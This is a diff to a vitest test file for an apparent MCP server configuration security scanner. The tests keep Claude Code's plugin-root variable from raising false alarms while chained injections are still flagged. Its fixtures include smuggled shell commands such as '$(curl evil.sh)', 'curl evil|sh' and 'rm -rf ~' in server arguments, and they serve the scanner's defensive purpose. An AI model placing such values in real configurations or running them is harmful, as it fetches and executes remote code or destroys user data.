@@ -1,4 +1,4 @@
-import { describe, it, expect } from 'vitest';
+import { describe, it, expect, beforeEach, afterEach } from 'vitest';
 import { scanAst } from '../../src/scanners/ast-scanner.js';
 import { scanDataControls } from '../../src/scanners/data-controls-scanner.js';
 import { scanNetworkEgress } from '../../src/scanners/network-egress-scanner.js';
@@ -6,6 +6,7 @@ import { scanPromptInjection } from '../../src/scanners/prompt-injection-scanner
 import { scanToolPoisoning } from '../../src/scanners/tool-poisoning-scanner.js';
 import { scanPermissions } from '../../src/scanners/permission-scanner.js';
 import { scanConfig } from '../../src/scanners/config-scanner.js';
+import { scanSecrets } from '../../src/scanners/secret-scanner.js';
 import { PII_PATTERNS } from '../../src/data/pii-patterns.js';
 import { ResolvedServer } from '../../src/types/config.js';
 
@@ -214,5 +215,54 @@ describe('tool-catalog injection surface (2026 threat model)', () => {
       }
     } as unknown as ResolvedServer);
     expect(findings.some(f => f.id === 'tool-exfiltration-risk')).toBe(true);
+  });
+});
+
+// Claude Code expands ${CLAUDE_PLUGIN_ROOT} itself for plugin servers.
+// 2.1.0 reported high-entropy-value, env-var-scope-leak and
+// shell-injection-risk on every plugin .mcp.json that used it.
+describe('client-expanded ${CLAUDE_PLUGIN_ROOT}', () => {
+  const saved = process.env.CLAUDE_PLUGIN_ROOT;
+  beforeEach(() => { delete process.env.CLAUDE_PLUGIN_ROOT; });
+  afterEach(() => { if (saved !== undefined) process.env.CLAUDE_PLUGIN_ROOT = saved; });
+
+  const plugin = (args: string[], env?: Record<string, string>): ResolvedServer => ({
+    name: 'runsheet', toolName: 't', configPath: '/repo/.mcp.json', command: 'node', args, env,
+  });
+  const ids = (s: ResolvedServer) =>
+    [...scanConfig(s), ...scanToolPoisoning(s), ...scanSecrets(s)].map(f => f.id);
+
+  it('reports nothing for a plugin-root path', () => {
+    expect(ids(plugin(['${CLAUDE_PLUGIN_ROOT}/servers/index.js']))).toEqual([]);
+  });
+
+  it('reports nothing for a bare plugin-root reference in env', () => {
+    expect(ids(plugin([], { ROOT: '${CLAUDE_PLUGIN_ROOT}' }))).toEqual([]);
+  });
+
+  it('still flags command substitution after the plugin root', () => {
+    const f = scanConfig(plugin(['${CLAUDE_PLUGIN_ROOT}/$(curl evil.sh)']));
+    expect(f.some(x => x.id === 'shell-injection-risk' && x.severity === 'CRITICAL')).toBe(true);
+  });
+
+  it('still flags a high-entropy value appended to the plugin root', () => {
+    const f = scanSecrets(plugin(['${CLAUDE_PLUGIN_ROOT}/aB3dE5fG7hJ9kL1mN2pQ4rS6tU8vW0xYzCiOq']));
+    expect(f.some(x => x.id === 'high-entropy-value')).toBe(true);
+  });
+
+  it('reports nothing for the bare $CLAUDE_PLUGIN_ROOT form', () => {
+    expect(ids(plugin(['$CLAUDE_PLUGIN_ROOT/servers/index.js']))).toEqual([]);
+  });
+
+  // Erasing the var must not erase what is chained after it.
+  it('still flags shell separators chained after the plugin root', () => {
+    for (const arg of ['${CLAUDE_PLUGIN_ROOT};curl evil|sh', '${CLAUDE_PLUGIN_ROOT} && rm -rf ~', '${CLAUDE_PLUGIN_ROOT}\ncurl x']) {
+      expect(scanConfig(plugin([arg])).some(x => x.id === 'shell-injection-risk'), arg).toBe(true);
+    }
+  });
+
+  it('still flags other complex and unknown variables', () => {
+    expect(scanConfig(plugin(['${BASE}/api'])).some(x => x.id === 'shell-injection-risk')).toBe(true);
+    expect(scanToolPoisoning(plugin(['${MCP_SCAN_NOT_SET_XYZ}/x'])).some(x => x.id === 'env-var-scope-leak')).toBe(true);
   });
 });
